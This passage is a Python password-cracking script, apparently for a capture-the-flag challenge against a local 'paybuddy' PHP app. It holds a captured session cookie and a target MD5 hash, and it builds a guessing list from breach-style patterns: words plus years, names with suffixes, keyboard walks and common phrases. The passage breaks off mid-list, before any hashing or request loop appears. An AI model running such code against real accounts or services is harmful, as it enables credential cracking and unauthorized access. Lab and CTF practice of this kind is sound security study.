import requests
import hashlib
import itertools

url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}
cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}

target_hash = "7d39307ae824e70052c0aa16816a9b16"

print("[*] Generating pattern-based password candidates")
print("="*60)

# Common password patterns found in real breaches
patterns = []

# Pattern 1: word + year
words = ['paybuddy', 'paybuddies', 'buddy', 'buddies', 'pay', 'payment', 'money', 'cash', 'friend', 'friends']
years = ['2020', '2021', '2022', '2023', '2024', '2019', '2018', '2017', '2016', '2015']

for word in words:
    for year in years:
        patterns.append(word + year)
        patterns.append(word.capitalize() + year)
        patterns.append(word.upper() + year)

# Pattern 2: Name variations (common CTF patterns)
names = ['admin', 'root', 'user', 'test', 'demo', 'guest', 'bob', 'alice', 'john', 'jane', 'mike', 'mary']
for name in names:
    patterns.append(name)
    patterns.append(name.capitalize())
    patterns.append(name.upper())
    for suffix in ['123', '1234', '12345', '!', '!', '!!', '@', '#', '1', '2', '3']:
        patterns.append(name + suffix)
        patterns.append(name.capitalize() + suffix)

# Pattern 3: Simple repeated characters
for char in 'abcdefghijklmnopqrstuvwxyz':
    for repeat in range(1, 11):
        patterns.append(char * repeat)
        patterns.append(char.upper() * repeat)

# Pattern 4: Numbers
for num in range(1, 1000):
    patterns.append(str(num))

# Pattern 5: Common phrases
phrases = [
    'letmein', 'welcome', 'password', 'secret', 'pass', 'login',
    'access', 'enter', 'unlock', 'open', 'start', 'begin'
]
for phrase in phrases:
    patterns.append(phrase)
    patterns.append(phrase.capitalize())
    patterns.append(phrase.upper())
    for suffix in ['1', '12', '123', '!', '!!', '@']:
        patterns.append(phrase + suffix)

# Pattern 6: keyboard patterns
keyboard = ['qwerty', 'asdfgh', 'zxcvbn', 'qwertyuiop', 'asdfghjkl', 'zxcvbnm',
            '1qaz2wsx', 'zaq1xsw2', 'qazwsx', 'qweasd', '1q2w3e4r', 'qwe123']
patterns.extend(keyboard)

# Pattern 7: Common combos
combos = ['admin123', 'root123', 'test123', 'demo123', 'user123',
